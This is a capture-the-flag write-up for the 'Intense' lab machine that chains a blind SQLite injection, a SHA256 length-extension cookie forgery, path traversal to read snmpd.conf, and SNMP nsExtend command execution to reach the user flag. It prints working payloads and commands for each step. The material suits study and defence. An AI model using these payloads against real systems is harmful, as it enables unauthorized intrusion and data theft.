## Overview

Intense is a hard-difficulty Linux box running an open-source Flask application backed by SQLite. The source is downloadable, so the path to user is a code-review exercise: a blind SQL injection leaks the admin's password hash, a hash length-extension attack forges an admin cookie, and an admin-only file reader leaks the SNMP read-write community string — which gives command execution and the user flag. This post covers recon through the user flag.

## Enumeration

Source review surfaces three issues that chain together:

- **`/submitmessage`** builds SQL with raw string formatting: `query_db("insert into messages values ('%s')" % message)` — classic injection, but the endpoint only returns `OK` or an error, so it is a *boolean* oracle. Input is capped at 140 chars and a few words (`rand`, `system`, `exec`, `date`) are blocked.
- **Session cookies** are `base64(data).base64(sig)` where `sig = SHA256(SECRET + data)` and `SECRET` is 8–15 random bytes. The parser loops over `key=value` pairs and keeps the **last** value for each key.
- **Admin log viewer** (`/admin/log/view`, `/admin/log/dir`) takes a filename with no path-traversal check.

## Foothold

**1 — Blind SQL injection to dump the admin hash.** SQLite's `load_extension(1)` reliably throws an error, so wrapping it in `CASE WHEN` turns any condition into a true/false signal (`OK` vs error). Walk the SHA256 hash one hex character at a time with `SUBSTR`:

```bash
# payload sent to /submitmessage (URL-encode before sending), iterate pos 1..64 and char 0..f:
#   ' and case when (select substr((select secret from users where username='admin'),<pos>,1)='<c>') then 1 else load_extension(1) end)-- -
```

The hash does not crack — but it does not need to.

**2 — Forge an admin cookie with a hash length-extension attack.** Because the MAC is `SHA256(secret || data)` and you know `data`, you can append bytes and compute a valid signature without the secret. Brute-force the secret length (8–15) and append `;username=admin;secret=<adminhash>;`; the last-value-wins parser then treats you as admin:

```bash
python3 -c "import hashpumpy,base64;sig,data=hashpumpy.hashpump('<guest_sig_hex>','username=guest;secret=<guesthash>;','username=admin;secret=<adminhash>;',12);print(base64.b64encode(data).decode());print(sig)"
```

**3 — Path traversal to read the SNMP config.** As admin, the log viewer reads arbitrary files. Pull `snmpd.conf`:

```bash
curl -s http://10.129.7.74/admin/log/view -b "auth=<forged_cookie>" --data-urlencode 'logfile=../../../../../../etc/snmp/snmpd.conf'
```

It contains a **read-write** community string (`rwcommunity <redacted>`).

**4 — SNMP RCE for a shell.** A read-write community string grants write access to the agent's MIB, including the NET-SNMP `nsExtend` table — which lets you define a command the agent will run. Create an extend entry and trigger it (numeric OIDs used here so it works even when the Kali MIB files are not installed; index `c1` = `2.99.49`):

```bash
snmpset -v2c -c <redacted> 10.129.7.74 .1.3.6.1.4.1.8072.1.3.2.2.1.2.2.99.49 s /usr/bin/id .1.3.6.1.4.1.8072.1.3.2.2.1.3.2.99.49 s "" .1.3.6.1.4.1.8072.1.3.2.2.1.21.2.99.49 i 4
snmpwalk -v2c -c <redacted> 10.129.7.74 .1.3.6.1.4.1.8072.1.3.2.3.1.2.2.99.49
# -> uid=111(Debian-snmp) gid=113(Debian-snmp)
```

## User flag

The `Debian-snmp` user can read the user flag directly — point an extend command at `cat`:

```bash
snmpset -v2c -c <redacted> 10.129.7.74 .1.3.6.1.4.1.8072.1.3.2.2.1.2.2.99.50 s /bin/cat .1.3.6.1.4.1.8072.1.3.2.2.1.3.2.99.50 s /home/user/user.txt .1.3.6.1.4.1.8072.1.3.2.2.1.21.2.99.50 i 4
snmpwalk -v2c -c <redacted> 10.129.7.74 .1.3.6.1.4.1.8072.1.3.2.3.1.2.2.99.50   # HTB{...}
```

Command execution as `Debian-snmp` and the user flag are ours.

Privilege escalation is left as an exercise — this post stops at user.
